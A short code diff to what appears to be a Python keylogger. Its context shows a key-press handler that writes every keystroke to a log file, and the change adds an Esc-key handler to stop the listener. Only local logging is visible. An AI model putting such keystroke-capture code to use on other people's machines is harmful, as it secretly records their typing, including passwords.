@@ -10,7 +10,11 @@ def keyPressed(key):
             # Log special keys
             logKey.write(f'[{key}]')
 
+def keyReleased(key):
+    if key==keyboard.Key.esc:
+        return 0
+
 if __name__=="__main__":
     
-    with keyboard.Listener(on_press=keyPressed) as listener:
+    with keyboard.Listener(on_press=keyPressed,on_release=keyReleased) as listener:
         listener.join()
